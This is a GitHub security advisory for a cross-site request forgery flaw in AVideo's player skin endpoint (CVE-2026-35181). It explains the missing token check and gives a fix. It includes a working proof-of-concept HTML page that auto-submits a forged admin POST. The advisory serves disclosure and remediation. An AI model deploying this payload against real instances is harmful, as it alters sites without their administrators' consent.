# [M] AVideo: CSRF on Player Skin Configuration via admin/playerUpdate.json.php

## Summary
Severity: Medium
Advisory: GHSA-4q27-4rrq-fx95
CVE: CVE-2026-35181
CWE: CWE-352
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-04-03
Source: https://github.com/advisories/GHSA-4q27-4rrq-fx95
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
**Severity:** Medium
**CWE:** CWE-352 (Cross-Site Request Forgery)

## Summary

The player skin configuration endpoint at `admin/playerUpdate.json.php` does not validate CSRF tokens. The `plugins` table is explicitly excluded from the ORM's domain-based security check via `ignoreTableSecurityCheck()`, removing the only other layer of defense. Combined with `SameSite=None` cookies, a cross-origin POST can modify the video player appearance on the entire platform.

## Details

In `admin/playerUpdate.json.php` at line 17, the player skin is set directly from POST data:

```php
$pluginDO->skin = $_POST['skin'];
```

No CSRF token is validated anywhere in the endpoint. Normally, the ORM layer performs a Referer/Origin domain check as a secondary defense against cross-origin writes. However, the `plugins` table is registered in `ignoreTableSecurityCheck()`, which explicitly bypasses this ORM-level protection for plugin configuration.

AVideo's session cookies are configured with `SameSite=None`, meaning the admin's authenticated session cookie is automatically included in cross-origin POST requests from any website.

An attacker can craft a page that, when visited by an authenticated admin, silently changes the player skin to any value, including potentially invalid or disruptive configurations.

## Proof of Concept

Host the following HTML on an attacker-controlled domain:

```html
<!DOCTYPE html>
<html>
<head><title>CSRF Player Skin</title></head>
<body>
<h1>Loading video...</h1>
<form id="csrf" method="POST"
      action="https://your-avideo-instance.com/admin/playerUpdate.json.php">
  <input type="hidden" name="skin" value="minimalist" />
</form>
<script>
  document.getElementById("csrf").submit();
</script>
</body>
</html>
```

When an authenticated admin visits this page, the platform's player skin is changed without their knowledge.

## Impact

- Platform-wide player appearance modification without admin consent
- Potential disruption of video playback if an invalid skin value is set
- The ORM security bypass via `ignoreTableSecurityCheck()` means there is no fallback protection
- Can be used as part of a broader defacement or social engineering attack

## Recommended Fix

Add CSRF token validation at `admin/playerUpdate.json.php`, before processing POST data:

```php
// admin/playerUpdate.json.php (before line 17)
if (!isGlobalTokenValid()) {
    die('{"error":"Invalid CSRF token"}');
}
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-4q27-4rrq-fx95
- https://nvd.nist.gov/vuln/detail/CVE-2026-35181
- https://github.com/WWBN/AVideo
